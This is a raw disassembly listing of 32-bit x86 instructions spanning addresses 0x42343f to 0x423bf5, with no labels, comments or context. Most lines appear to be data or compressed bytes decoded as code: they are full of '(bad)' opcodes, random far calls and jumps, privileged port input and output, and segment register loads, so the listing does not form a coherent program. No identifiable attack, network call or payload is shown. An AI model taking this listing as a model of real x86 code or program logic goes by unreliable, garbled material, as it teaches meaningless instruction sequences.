  42343f:	stos   BYTE PTR es:[edi],al
  423440:	xchg   BYTE PTR [esi],ch
  423442:	inc    ebp
  423443:	rol    DWORD PTR [eax],cl
  423445:	inc    edx
  423446:	cmp    DWORD PTR [esi-0x537df348],ecx
  42344c:	setne  cl
  42344f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423450:	sbb    ax,0x2277
  423454:	cmp    ebx,eax
  423456:	push   0x35d26cbf
  42345b:	icebp  
  42345c:	cwde   
  42345d:	les    esi,FWORD PTR [ebp-0xd]
  423460:	xlat   BYTE PTR ds:[ebx]
  423461:	ret    
  423462:	test   al,0x4d
  423464:	xor    DWORD PTR [ebp-0x33bdb0fc],edi
  42346a:	jp     0x423481
  42346c:	and    BYTE PTR [ecx],dl
  42346e:	adc    dl,BYTE PTR [eax+0x1c259eb6]
  423474:	pop    esp
  423475:	xor    eax,0x896d0001
  42347a:	push   ds
  42347b:	rol    edi,cl
  42347d:	jmp    0x4371ad86
  423482:	cmp    dh,bh
  423484:	inc    ecx
  423485:	mov    ecx,0x8bf70309
  42348a:	loop   0x42342b
  42348c:	mov    ebp,0x4b795c24
  423491:	dec    esp
  423492:	fdiv   DWORD PTR [ebx-0xdbd7784]
  423498:	mov    ds:0x1ad8caee,al
  42349d:	call   0x66c4:0x2a53f578
  4234a4:	leave  
  4234a5:	jbe    0x4234e4
  4234a7:	xchg   esp,eax
  4234a8:	stos   BYTE PTR es:[edi],al
  4234a9:	das    
  4234aa:	jnp    0x423430
  4234ac:	mov    edx,0x697f4a97
  4234b1:	mov    cs,WORD PTR [ecx-0x64]
  4234b4:	sbb    BYTE PTR [ebp-0x396421bf],ah
  4234ba:	int    0xa8
  4234bc:	xchg   esp,edi
  4234be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234bf:	xchg   DWORD PTR [ecx-0x69],eax
  4234c2:	cmp    BYTE PTR ss:[eiz*1-0x47f7b96e],dl
  4234ca:	retf   0xe8b7
  4234cd:	in     al,0x17
  4234cf:	adc    al,BYTE PTR [eax-0xc]
  4234d2:	mov    al,0xd7
  4234d4:	mov    edx,0x721b8965
  4234d9:	sub    esp,esp
  4234db:	ret    
  4234dc:	pop    edx
  4234dd:	mov    eax,0xc68cf380
  4234e2:	pushf  
  4234e3:	push   esi
  4234e4:	aaa    
  4234e5:	retf   
  4234e6:	jg     0x423558
  4234e8:	dec    edx
  4234e9:	xchg   DWORD PTR [edx+0x657c2898],edx
  4234ef:	imul   edi,DWORD PTR [edx+edx*2],0x3c
  4234f3:	adc    esp,ebx
  4234f5:	rcr    BYTE PTR [esi+0x4558dc04],cl
  4234fb:	dec    ecx
  4234fc:	cmp    dl,BYTE PTR [edx]
  4234fe:	test   BYTE PTR [edx-0x6c607c37],bl
  423504:	loop   0x423531
  423506:	scas   eax,DWORD PTR es:[edi]
  423507:	out    dx,eax
  423508:	sbb    DWORD PTR [ebx],eax
  42350a:	push   ebp
  42350b:	sub    dl,BYTE PTR [ebp+ebp*2+0x3f8e4602]
  423512:	cmp    DWORD PTR [esi+0x491b1e23],eax
  423518:	lea    ebx,[edx+0x314b3197]
  42351e:	inc    ecx
  42351f:	out    0xde,al
  423521:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423522:	cli    
  423523:	imul   BYTE PTR [ebp*2-0x77f706d7]
  42352a:	in     al,0xc5
  42352c:	add    al,0x45
  42352e:	stos   DWORD PTR es:[edi],eax
  42352f:	mov    bl,BYTE PTR [ecx+eiz*8-0x3a]
  423533:	fwait
  423534:	jge    0x42358b
  423536:	lea    edx,ds:0xa715a285
  42353c:	ret    0xf01f
  42353f:	sar    BYTE PTR [esi],0xdc
  423542:	mov    bh,bh
  423544:	jmp    0x66f9:0x90444ff
  42354b:	add    ecx,DWORD PTR [ecx-0x55a33407]
  423551:	adc    dl,0x6f
  423554:	enter  0xeb62,0xa4
  423558:	mov    al,BYTE PTR [esi+eiz*2+0x37]
  42355c:	retf   
  42355d:	lods   eax,DWORD PTR ds:[esi]
  42355e:	fistp  DWORD PTR [ecx+0x2b]
  423561:	mov    esp,DWORD PTR ds:0xa28207eb
  423567:	and    DWORD PTR [esi+0x41b56599],ecx
  42356d:	fisttp DWORD PTR [ecx]
  42356f:	(bad)  
  423570:	xchg   ebx,eax
  423571:	jge    0x42354c
  423573:	mov    BYTE PTR [edx],cl
  423575:	jecxz  0x423595
  423577:	push   ecx
  423578:	xchg   edx,eax
  423579:	shl    dl,cl
  42357b:	and    DWORD PTR [esi],ebx
  42357d:	mov    BYTE PTR [edx+0x26],dl
  423580:	std    
  423581:	mov    ebp,esi
  423583:	repnz sti 
  423585:	bound  edi,QWORD PTR [ebp-0x6a]
  423588:	loope  0x42355d
  42358a:	pop    esp
  42358b:	xor    eax,0x54401f6b
  423590:	adc    dl,BYTE PTR [ebx+0x46579df]
  423596:	mov    al,ds:0x5ac90b1b
  42359b:	shl    BYTE PTR [ecx+eax*2],cl
  42359e:	mov    eax,0x1881b4c2
  4235a3:	jb     0x4235dd
  4235a5:	rcr    DWORD PTR [ebx+0x6f4e8864],1
  4235ab:	xchg   ecx,eax
  4235ac:	repz cs jge 0x4235f1
  4235b0:	pop    ds
  4235b1:	push   ecx
  4235b2:	repz xadd BYTE PTR [ebp+0x2db9994a],cl
  4235ba:	mov    eax,ds:0xfaff3ebb
  4235bf:	out    dx,al
  4235c0:	xlat   BYTE PTR ds:[ebx]
  4235c1:	cwde   
  4235c2:	cmp    BYTE PTR [esp+eiz*8+0x37186c76],ch
  4235c9:	and    DWORD PTR [ecx],edi
  4235cb:	sti    
  4235cc:	mov    esi,0x38791e5e
  4235d1:	outs   dx,DWORD PTR ds:[esi]
  4235d2:	mov    ebx,0xeb931b53
  4235d7:	gs or  eax,0x70c47c6c
  4235dd:	xchg   esp,eax
  4235de:	lock ja 0x42364b
  4235e1:	(bad)  
  4235e2:	out    0x5d,eax
  4235e4:	shl    DWORD PTR [ecx-0x44],1
  4235e7:	gs adc ecx,ecx
  4235ea:	xchg   edi,eax
  4235eb:	jnp    0x42363f
  4235ed:	pop    esp
  4235ee:	in     al,dx
  4235ef:	adc    BYTE PTR [ebp+0x7f],0x2b
  4235f3:	pop    ebx
  4235f4:	call   DWORD PTR [edx]
  4235f6:	xlat   BYTE PTR ds:[ebx]
  4235f7:	test   DWORD PTR [edi],ebx
  4235f9:	popf   
  4235fa:	addr16 nop
  4235fc:	stos   DWORD PTR es:[edi],eax
  4235fd:	jge    0x4235a6
  4235ff:	push   esp
  423600:	loope  0x423606
  423602:	adc    al,0x11
  423604:	sbb    eax,0xa47406b1
  423609:	cmc    
  42360a:	fist   DWORD PTR [ecx]
  42360c:	or     eax,0xa5774fbc
  423611:	into   
  423612:	loope  0x423671
  423614:	push   cs
  423615:	jg     0x423602
  423617:	ficomp DWORD PTR [esi-0x4e45598a]
  42361d:	ja     0x4235ff
  42361f:	mov    ds:0xa45dc01f,eax
  423624:	ins    BYTE PTR es:[edi],dx
  423625:	xor    DWORD PTR [ecx],edi
  423627:	in     al,dx
  423628:	sbb    eax,0x6b57eaa5
  42362d:	mov    cl,0x1f
  42362f:	inc    ecx
  423630:	xchg   BYTE PTR [ecx+0x75c78977],bl
  423636:	leave  
  423637:	(bad)  
  423638:	and    DWORD PTR [edx],ebx
  42363a:	xchg   edx,eax
  42363b:	leave  
  42363c:	adc    ebx,0x24
  42363f:	mov    ecx,DWORD PTR [ecx-0xd]
  423642:	sub    al,0x45
  423644:	scas   al,BYTE PTR es:[edi]
  423645:	std    
  423646:	push   es
  423647:	xchg   ecx,eax
  423648:	(bad)  
  423649:	js     0x4235d7
  42364b:	jecxz  0x4235f0
  42364d:	cmc    
  42364e:	(bad)  
  42364f:	mov    DWORD PTR [edx+0x54],edx
  423652:	cmp    al,BYTE PTR [eax]
  423654:	cmp    al,0xe2
  423656:	clc    
  423657:	lods   al,BYTE PTR ds:[esi]
  423658:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423659:	push   0x31
  42365b:	xlat   BYTE PTR ds:[ebx]
  42365c:	cli    
  42365d:	add    eax,DWORD PTR [ecx+ebx*2-0x75e6c481]
  423664:	sbb    edi,DWORD PTR [edx+0x2d6cb67d]
  42366a:	push   ecx
  42366b:	xchg   esi,eax
  42366c:	scas   eax,DWORD PTR es:[edi]
  42366d:	jb     0x4236ec
  42366f:	and    eax,0xc3c76ace
  423674:	in     eax,0x5f
  423676:	sub    DWORD PTR [esi-0x75b7b37e],edi
  42367c:	lods   eax,DWORD PTR ds:[esi]
  42367d:	mov    al,cl
  42367f:	push   edx
  423680:	lods   al,BYTE PTR ds:[esi]
  423681:	jo     0x4236b0
  423683:	or     ecx,DWORD PTR [eax+edi*2+0x37]
  423687:	inc    ebx
  423688:	mov    bh,0xcf
  42368a:	mov    edi,0x27ed275f
  42368f:	pop    ds
  423690:	popaw  
  423692:	pop    ebp
  423694:	or     al,BYTE PTR [edi+0x5a]
  423697:	fwait
  423698:	stc    
  423699:	inc    ebx
  42369a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42369b:	xchg   ebx,eax
  42369c:	cwde   
  42369d:	cli    
  42369e:	sbb    BYTE PTR [esi-0x7d],bl
  4236a1:	jl     0x423693
  4236a3:	xchg   ebp,eax
  4236a4:	cmp    DWORD PTR [ebx-0x22800202],eax
  4236aa:	adc    al,ah
  4236ac:	sub    ecx,ebx
  4236ae:	mov    ah,0xcb
  4236b0:	ficom  DWORD PTR [ebx+0x54]
  4236b3:	adc    al,0xa1
  4236b5:	sti    
  4236b6:	jne    0x423735
  4236b8:	fs xchg ebp,eax
  4236ba:	neg    DWORD PTR [edi]
  4236bc:	and    DWORD PTR ds:0x81eabfe6,edi
  4236c2:	cmp    BYTE PTR [ebp-0x68],bl
  4236c5:	xchg   esi,eax
  4236c6:	sub    ebx,DWORD PTR [eax+0x3d3a99db]
  4236cc:	fsubrp st(5),st
  4236ce:	or     al,0xe1
  4236d0:	mov    ds:0xdfcc8b3a,eax
  4236d5:	pushf  
  4236d6:	(bad)  
  4236d7:	jbe    0x423742
  4236d9:	loope  0x4236fa
  4236db:	and    BYTE PTR [edx+0x75],dh
  4236de:	dec    ecx
  4236df:	test   DWORD PTR [esi],0xaccdea6d
  4236e5:	adc    DWORD PTR [edi-0x60],ebx
  4236e8:	call   0x8cf:0x21791a74
  4236ef:	gs aaa 
  4236f1:	pop    edi
  4236f2:	inc    esp
  4236f3:	mov    al,ds:0x6dbae19f
  4236f8:	push   eax
  4236f9:	add    ch,dl
  4236fb:	scas   al,BYTE PTR es:[edi]
  4236fc:	mov    al,ds:0xcc7f7158
  423701:	mov    edx,0x4c445ca5
  423706:	push   esi
  423707:	dec    edx
  423708:	scas   al,BYTE PTR es:[edi]
  423709:	jg     0x423712
  42370b:	jmp    0xb4828dbf
  423710:	repnz fidiv DWORD PTR [ebp-0x1e106320]
  423717:	in     al,0xfe
  423719:	in     eax,0x17
  42371b:	nop
  42371c:	mov    cl,0xe7
  42371e:	retf   
  42371f:	ds mov bh,0x8e
  423722:	and    edi,eax
  423724:	(bad)  
  423725:	mov    al,0x40
  423727:	out    dx,al
  423728:	or     DWORD PTR [edi-0x14],0x7f80eb21
  42372f:	les    ebp,FWORD PTR [ecx+ebx*1]
  423732:	cmp    al,0xd
  423734:	fsubr  DWORD PTR [ebx-0x634a8c67]
  42373a:	xchg   esi,eax
  42373b:	inc    edi
  42373c:	(bad)  
  42373d:	jne    0x4236ec
  42373f:	pusha  
  423740:	add    eax,0x2a439ef8
  423745:	inc    eax
  423746:	scas   al,BYTE PTR es:[edi]
  423747:	repz sbb al,0xf1
  42374a:	cmp    al,BYTE PTR [edx]
  42374c:	xor    BYTE PTR ds:0x479d3457,ah
  423752:	xchg   ch,dh
  423754:	fmul   QWORD PTR ds:0x53e086ac
  42375a:	pop    edx
  42375b:	xchg   edx,eax
  42375c:	jo     0x423769
  42375e:	(bad)  
  42375f:	and    esi,DWORD PTR ds:0xbac68738
  423765:	mov    edi,es
  423767:	int    0xa5
  423769:	cdq    
  42376a:	push   eax
  42376b:	mov    esi,0x3d9772f6
  423770:	aam    0xf0
  423772:	inc    edx
  423773:	icebp  
  423774:	jge    0x423729
  423776:	loope  0x4237d5
  423778:	sbb    al,0xfa
  42377a:	cmc    
  42377b:	frstor [edx]
  42377d:	scas   al,BYTE PTR es:[edi]
  42377e:	xlat   BYTE PTR ds:[ebx]
  42377f:	dec    ebp
  423780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423781:	pop    edi
  423782:	mov    DWORD PTR [ecx-0x71],edx
  423785:	or     DWORD PTR [ebp-0x11],0xb50e6e43
  42378c:	add    eax,0xbdbe4c58
  423791:	orps   xmm7,XMMWORD PTR [ebp+0x33]
  423795:	in     al,dx
  423796:	jl     0x42380c
  423798:	sub    dh,BYTE PTR [esi-0x19bfa144]
  42379e:	into   
  42379f:	gs xor edi,ebp
  4237a2:	sbb    DWORD PTR [eax-0x138bedfa],0x0
  4237a9:	test   BYTE PTR [ecx+0x76],cl
  4237ac:	inc    eax
  4237ad:	xor    edi,DWORD PTR [ebx-0x50bdc550]
  4237b3:	inc    esp
  4237b4:	xlat   BYTE PTR ds:[ebx]
  4237b5:	pop    ebp
  4237b6:	jecxz  0x42381e
  4237b8:	and    eax,0x4edb6be
  4237bd:	xor    eax,0xb7e128f
  4237c2:	or     eax,0x18009896
  4237c7:	out    dx,al
  4237c8:	mov    BYTE PTR [eax-0x4cfb9ee4],dh
  4237ce:	or     ch,ch
  4237d0:	add    DWORD PTR [edi-0x5f484ec1],ecx
  4237d6:	ins    BYTE PTR es:[edi],dx
  4237d7:	mov    BYTE PTR [ebx+0x11],al
  4237da:	push   eax
  4237db:	inc    ebx
  4237dc:	mov    bh,0xd0
  4237de:	adc    eax,0x1771b1fb
  4237e3:	dec    ebp
  4237e4:	mov    eax,ds:0x7ee7118a
  4237e9:	and    eax,0x52d321b5
  4237ee:	cmp    eax,0x45fd7399
  4237f3:	mov    bh,0x18
  4237f5:	inc    ebp
  4237f6:	jge    0x423803
  4237f8:	inc    edi
  4237f9:	and    BYTE PTR [edi+0x6c],bh
  4237fc:	stc    
  4237fd:	xchg   esi,eax
  4237fe:	push   edx
  4237ff:	mov    eax,ds:0x6acd40d6
  423804:	jae    0x4237d1
  423806:	aaa    
  423807:	adc    dh,dh
  423809:	xchg   edx,eax
  42380a:	jg     0x42383d
  42380c:	ins    BYTE PTR es:[edi],dx
  42380d:	sbb    ebp,DWORD PTR [eax-0x71]
  423810:	push   eax
  423811:	adc    BYTE PTR [edi],bh
  423813:	into   
  423814:	xchg   edi,eax
  423815:	cwde   
  423816:	loop   0x42386b
  423818:	ja     0x4237db
  42381a:	lds    ecx,FWORD PTR [esi-0x2dcdaba2]
  423820:	jae    0x42388d
  423822:	dec    eax
  423823:	test   eax,0xce9a368c
  423828:	dec    ebx
  423829:	stc    
  42382a:	push   esi
  42382b:	dec    esp
  42382c:	push   es
  42382d:	jmp    0xa397:0x8df13110
  423834:	aaa    
  423835:	inc    edi
  423836:	div    BYTE PTR [ebp+edi*8-0x5edd78f8]
  42383d:	mov    ah,0xc2
  42383f:	call   0x9765:0xb971654b
  423846:	or     eax,0x10f83644
  42384b:	and    ah,ch
  42384d:	shl    al,cl
  42384f:	in     eax,dx
  423850:	fmul   DWORD PTR [eax+0x60]
  423853:	iret   
  423854:	adc    ebx,ecx
  423856:	push   eax
  423857:	or     esp,DWORD PTR [esi-0x782f76ff]
  42385d:	pop    ecx
  42385e:	scas   al,BYTE PTR es:[edi]
  42385f:	xor    al,0xb2
  423861:	cld    
  423862:	(bad)  
  423863:	xchg   esi,eax
  423864:	(bad)  
  423865:	ins    BYTE PTR es:[edi],dx
  423866:	jl     0x423841
  423868:	outs   dx,DWORD PTR ds:[esi]
  423869:	pop    edx
  42386a:	mov    ebx,0x57e1f00e
  42386f:	aad    0x44
  423871:	xor    dh,ah
  423873:	iret   
  423874:	adc    DWORD PTR [esi],esp
  423876:	sti    
  423877:	dec    edx
  423878:	lahf   
  423879:	cmp    ebp,DWORD PTR [ecx]
  42387b:	pop    edx
  42387c:	scas   eax,DWORD PTR es:[edi]
  42387d:	les    ebp,FWORD PTR [esp-0x54]
  423881:	loop   0x4238e3
  423883:	lahf   
  423884:	ds xchg esi,eax
  423886:	jae    0x423884
  423888:	jmp    0xbbe673c5
  42388d:	out    dx,al
  42388e:	rcl    BYTE PTR [ebp+0x4c239403],1
  423894:	add    BYTE PTR [edx],bl
  423896:	and    BYTE PTR [esi+0x6a],0x56
  42389a:	sbb    edx,edi
  42389c:	ror    BYTE PTR [ecx+edi*1],cl
  42389f:	or     eax,0xad7aa003
  4238a4:	jne    0x423889
  4238a6:	push   0x3b5773dd
  4238ab:	repnz test al,0xd6
  4238ae:	int3   
  4238af:	inc    ecx
  4238b0:	push   ds
  4238b1:	and    DWORD PTR [edx+esi*4-0x3673314c],eax
  4238b8:	fs icebp 
  4238ba:	jbe    0x42387e
  4238bc:	sub    al,0x96
  4238be:	jo     0x42387c
  4238c0:	imul   edi,edx,0x3a8016aa
  4238c6:	jg     0x4238e2
  4238c8:	push   ebp
  4238c9:	test   DWORD PTR [ebp-0x3a4aba88],edi
  4238cf:	cdq    
  4238d0:	imul   ecx,ebx,0x56596df4
  4238d6:	in     eax,dx
  4238d7:	mov    ecx,?
  4238d9:	popa   
  4238da:	xor    bl,bl
  4238dc:	not    edx
  4238de:	(bad)  
  4238df:	je     0x423902
  4238e1:	mov    al,0x3c
  4238e3:	push   cs
  4238e4:	mov    al,ds:0x659b6a91
  4238e9:	outs   dx,DWORD PTR ds:[esi]
  4238ea:	or     eax,0x6f10d4dc
  4238ef:	pop    ss
  4238f0:	sbb    BYTE PTR [ebp+0x52],dh
  4238f3:	pop    ebp
  4238f4:	(bad)  
  4238f5:	push   ss
  4238f6:	sbb    bl,BYTE PTR [edx-0x54]
  4238f9:	jno    0x423937
  4238fb:	daa    
  4238fc:	mov    esp,0x527dddee
  423901:	mov    al,0x2a
  423903:	mov    al,ds:0xd9add227
  423908:	sub    eax,0x5ece9f2d
  42390d:	leave  
  42390e:	fcom   DWORD PTR [esi]
  423910:	das    
  423911:	xor    DWORD PTR [esi-0x21639f22],ebp
  423917:	sbb    DWORD PTR [eax+ebp*2],edx
  42391a:	sub    dh,0x4a
  42391d:	sbb    ebp,DWORD PTR [eax-0x1f493e24]
  423923:	push   cs
  423924:	out    0xc6,eax
  423926:	and    ah,BYTE PTR [eax]
  423928:	outs   dx,BYTE PTR ds:[esi]
  423929:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42392a:	sbb    bl,al
  42392c:	outs   dx,BYTE PTR ds:[esi]
  42392d:	aas    
  42392e:	cmp    edx,ecx
  423930:	or     eax,0xd3efe2d1
  423935:	mov    ds:0xf068e193,al
  42393a:	ret    0x6f45
  42393d:	pop    edx
  42393e:	into   
  42393f:	aam    0x57
  423941:	adc    dl,bl
  423943:	push   0x94303fb6
  423948:	or     ah,al
  42394a:	jae    0x423932
  42394c:	(bad)  
  42394d:	xchg   edi,eax
  42394e:	in     eax,dx
  42394f:	mov    bl,0xe1
  423951:	cli    
  423952:	scas   eax,DWORD PTR es:[edi]
  423953:	mov    edi,0x1dcf9076
  423958:	fnstcw WORD PTR [esi]
  42395a:	jbe    0x4238e5
  42395c:	test   eax,0x8fd0609d
  423961:	shl    DWORD PTR [ebx-0xb],cl
  423964:	jno    0x423990
  423966:	ds jle 0x42396a
  423969:	push   esp
  42396a:	nop
  42396b:	addr16 jge 0x423914
  42396e:	inc    ebx
  42396f:	dec    ebp
  423970:	(bad)  
  423971:	scas   al,BYTE PTR es:[edi]
  423972:	fsubrp st(6),st
  423974:	add    DWORD PTR [esp+ecx*2-0x55b7d0e0],ebp
  42397b:	dec    ebx
  42397c:	adc    BYTE PTR [ecx],ch
  42397e:	fdiv   DWORD PTR [ebx-0xb]
  423981:	cmc    
  423982:	daa    
  423983:	lods   al,BYTE PTR ds:[esi]
  423984:	ins    DWORD PTR es:[edi],dx
  423985:	jnp    0x4239e8
  423987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423988:	lahf   
  423989:	jp     0x4239e2
  42398b:	cmp    eax,0x7f1ef2b6
  423990:	pop    edx
  423991:	scas   al,BYTE PTR es:[edi]
  423992:	inc    edx
  423993:	sti    
  423994:	(bad)  
  423995:	push   ds
  423996:	or     ebp,DWORD PTR [ebx-0x23b14aec]
  42399c:	(bad)  
  42399e:	xor    dl,BYTE PTR [esi]
  4239a0:	in     eax,0xcb
  4239a2:	push   ebx
  4239a3:	xchg   DWORD PTR [ebx-0x3d],edx
  4239a6:	cld    
  4239a7:	(bad)  
  4239a8:	push   0x616f1fcc
  4239ad:	imul   esi,esp,0xffffffc4
  4239b0:	sub    al,0xc3
  4239b2:	scas   eax,DWORD PTR es:[edi]
  4239b3:	es add al,0xea
  4239b6:	loopne 0x4239c0
  4239b8:	lock xchg edi,eax
  4239ba:	pushf  
  4239bb:	or     DWORD PTR [eax-0x70],ebx
  4239be:	jno    0x4239ae
  4239c0:	out    0x24,eax
  4239c2:	aam    0x4e
  4239c4:	or     DWORD PTR [esi-0x63],eax
  4239c7:	out    0xe2,al
  4239c9:	aam    0x22
  4239cb:	xor    BYTE PTR [esi-0x6b],0xba
  4239cf:	inc    edx
  4239d0:	mov    ds:0xf5147818,ax
  4239d6:	push   0x20f66ef0
  4239db:	je     0x423a11
  4239dd:	cmp    dl,dl
  4239df:	ret    0x3aff
  4239e2:	xchg   esi,eax
  4239e3:	xchg   ebx,eax
  4239e4:	mov    ecx,?
  4239e6:	in     al,0xd1
  4239e8:	jne    0x4239b3
  4239ea:	push   ss
  4239eb:	dec    ebx
  4239ec:	jae    0x42398d
  4239ee:	sti    
  4239ef:	and    ebp,DWORD PTR [ebx]
  4239f1:	ins    DWORD PTR es:[edi],dx
  4239f2:	dec    esp
  4239f3:	adc    al,0xa1
  4239f5:	add    DWORD PTR [esi-0x1f694191],edx
  4239fb:	rol    DWORD PTR [esi],1
  4239fd:	mov    DWORD PTR [eax],0xf010d2e3
  423a03:	lahf   
  423a04:	out    0x8f,eax
  423a06:	fwait
  423a07:	cdq    
  423a08:	and    cl,BYTE PTR [ebx+ebp*4-0x38]
  423a0c:	cmp    ch,0x12
  423a0f:	add    eax,esp
  423a11:	mov    ds,eax
  423a13:	popa   
  423a14:	je     0x4239a5
  423a16:	push   edx
  423a17:	pop    ds
  423a18:	(bad)  
  423a19:	cmp    al,0xca
  423a1b:	cmp    DWORD PTR gs:[ecx],ebx
  423a1e:	test   al,0xd5
  423a20:	lods   eax,DWORD PTR ds:[esi]
  423a21:	sub    eax,eax
  423a23:	cmp    eax,0x7df6dcb0
  423a28:	mov    eax,ds:0xe8f6e5a7
  423a2d:	rcl    BYTE PTR [ebx-0x19fc1493],1
  423a33:	lock stos BYTE PTR es:[edi],al
  423a35:	adc    ah,0xf0
  423a38:	pop    edi
  423a39:	out    0xd6,al
  423a3b:	xor    eax,0x31e02ac6
  423a40:	popa   
  423a41:	or     eax,0x44a9ca11
  423a46:	int    0x26
  423a48:	and    eax,0xd85c1ae1
  423a4d:	dec    esi
  423a4e:	add    DWORD PTR [ebx+edx*2],esi
  423a51:	dec    ebp
  423a52:	sti    
  423a53:	cmp    ebp,DWORD PTR [eax]
  423a55:	cmp    eax,0x4f191991
  423a5a:	push   edi
  423a5b:	xchg   edx,eax
  423a5c:	xchg   edi,eax
  423a5d:	mov    al,ds:0x2e263733
  423a62:	test   BYTE PTR [edi-0x58],0x99
  423a66:	jb     0x423a7b
  423a68:	or     dl,BYTE PTR [esp+edx*4]
  423a6b:	or     DWORD PTR [ecx-0x1bfc754a],0x4
  423a72:	out    dx,eax
  423a73:	gs fucom st(0)
  423a76:	dec    edx
  423a77:	adc    eax,0x1d35eab4
  423a7c:	jp     0x423ace
  423a7e:	shl    BYTE PTR [esi],0xc
  423a81:	test   eax,0x2bdaec2c
  423a86:	(bad)  
  423a87:	xor    ah,ch
  423a89:	je     0x423a60
  423a8b:	(bad)  
  423a8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a8d:	into   
  423a8e:	sbb    DWORD PTR [eax-0x5c17a7af],ebx
  423a94:	mov    cl,0xf6
  423a96:	inc    esp
  423a97:	inc    esp
  423a98:	xchg   ebx,eax
  423a99:	xor    ah,0x25
  423a9c:	cdq    
  423a9d:	test   eax,esp
  423a9f:	mov    DWORD PTR [esi+0x6],eax
  423aa2:	or     edx,DWORD PTR [ecx+esi*8+0x1ee29d24]
  423aa9:	sub    esp,DWORD PTR [ecx-0x23662a9a]
  423aaf:	(bad)
  423ab2:	fstp   TBYTE PTR [ebx-0x4b2ca5ee]
  423ab8:	mov    ch,0x95
  423aba:	les    edx,FWORD PTR [ecx+0x78]
  423abd:	jns    0x423b06
  423abf:	repnz mov bl,0xac
  423ac2:	mov    edx,DWORD PTR [ecx+ebx*8+0x5d]
  423ac6:	popa   
  423ac7:	mov    esp,0xb0d87205
  423acc:	fsubr  st(5),st
  423ace:	ins    BYTE PTR es:[edi],dx
  423acf:	jmp    0x423a93
  423ad1:	stos   DWORD PTR es:[edi],eax
  423ad2:	jle    0x423b44
  423ad4:	test   eax,0xf9da9bbf
  423ad9:	add    edi,DWORD PTR [edx]
  423adb:	jmp    0x7defa95c
  423ae0:	mov    ch,0xb6
  423ae2:	or     BYTE PTR [ebx],bh
  423ae4:	rcr    edx,0xba
  423ae7:	mov    cs,WORD PTR [esi-0x4d]
  423aea:	adc    BYTE PTR [esi],dh
  423aec:	xor    eax,0x6541f94b
  423af1:	loope  0x423b64
  423af3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423af4:	aad    0x6e
  423af6:	in     eax,dx
  423af7:	adc    BYTE PTR [edx-0x13],bh
  423afa:	sti    
  423afb:	mov    ds:0xf74b3b96,eax
  423b00:	call   0x8008:0x325a1bf
  423b07:	adc    BYTE PTR [ecx+0x3a4750c4],0x21
  423b0e:	scas   al,BYTE PTR es:[edi]
  423b0f:	cwde   
  423b10:	repnz mov dl,0x9
  423b13:	js     0x423b83
  423b15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b16:	nop    ebx
  423b19:	mov    edx,0x7c36d4cc
  423b1e:	rol    DWORD PTR [ebx+0x3e],cl
  423b21:	test   BYTE PTR [eax+0x44],dh
  423b24:	sahf   
  423b25:	sbb    eax,0xb46a26ba
  423b2a:	inc    ebp
  423b2b:	sbb    esp,0xbc034269
  423b31:	push   0x361c3ce9
  423b36:	jne    0x423ac4
  423b38:	stos   DWORD PTR es:[edi],eax
  423b39:	push   ecx
  423b3a:	aad    0x30
  423b3c:	sub    cl,BYTE PTR [ecx+0xe]
  423b3f:	int3   
  423b40:	pushf  
  423b41:	test   eax,0x30f0c431
  423b46:	add    eax,0xf05f3452
  423b4b:	mov    eax,ds:0xe45b0dd4
  423b50:	mov    BYTE PTR [edx],dl
  423b52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b53:	into   
  423b54:	out    0x35,eax
  423b56:	(bad)  
  423b57:	stos   DWORD PTR es:[edi],eax
  423b58:	addr16 cmp ebp,edx
  423b5b:	popf   
  423b5c:	in     al,0x69
  423b5e:	sti    
  423b5f:	pop    esp
  423b60:	sbb    DWORD PTR [edx],ebp
  423b62:	push   es
  423b63:	jno    0x423b00
  423b65:	sbb    BYTE PTR [ecx],ch
  423b67:	and    eax,0xbc23baa0
  423b6c:	xor    DWORD PTR [ecx+0x6c],edi
  423b6f:	add    BYTE PTR [ecx-0x7ff24f49],cl
  423b75:	gs add BYTE PTR ds:[edi],0x2
  423b7a:	repz push 0x80744552
  423b80:	std    
  423b81:	dec    ebx
  423b82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b83:	lahf   
  423b84:	dec    ebp
  423b85:	push   0x69
  423b87:	aas    
  423b88:	jmp    0xd48f:0xa7d9e3a0
  423b8f:	xor    bl,dh
  423b91:	enter  0xe2cf,0x14
  423b95:	push   ebp
  423b96:	mov    edi,0x93a82ea0
  423b9b:	fst    DWORD PTR [ebp+0x16d33450]
  423ba1:	inc    edx
  423ba2:	xchg   BYTE PTR [eax],bh
  423ba4:	aaa    
  423ba5:	jg     0x423b9d
  423ba7:	call   0x16d19794
  423bac:	loope  0x423bf6
  423bae:	ds out 0xbc,eax
  423bb1:	scas   al,BYTE PTR es:[edi]
  423bb2:	adc    ecx,edi
  423bb4:	ins    DWORD PTR es:[edi],dx
  423bb5:	addr16 pop ecx
  423bb7:	or     BYTE PTR [ecx+0x1a3533e4],ah
  423bbd:	arpl   WORD PTR [edx+0x419a78f7],bx
  423bc3:	leave  
  423bc4:	mov    ch,0x82
  423bc6:	das    
  423bc7:	clc    
  423bc8:	xchg   edx,eax
  423bc9:	or     al,0x81
  423bcb:	dec    ebx
  423bcc:	stos   BYTE PTR es:[edi],al
  423bcd:	and    al,0xb7
  423bcf:	ins    BYTE PTR es:[edi],dx
  423bd0:	lea    edx,[ebx]
  423bd2:	cmp    al,0xcc
  423bd4:	jno    0x423b80
  423bd6:	mov    edi,gs
  423bd8:	or     edx,DWORD PTR [ebx]
  423bda:	fld    TBYTE PTR [esp+ecx*8+0x561fd31]
  423be1:	ins    DWORD PTR es:[edi],dx
  423be2:	adc    dh,ch
  423be4:	xor    eax,0x68c19a8d
  423be9:	out    0xc0,eax
  423beb:	je     0x423c41
  423bed:	jns    0x423bd9
  423bef:	xchg   ebp,eax
  423bf0:	mov    ds:0xca414671,al
  423bf5:	jmp    0xca3c77d2
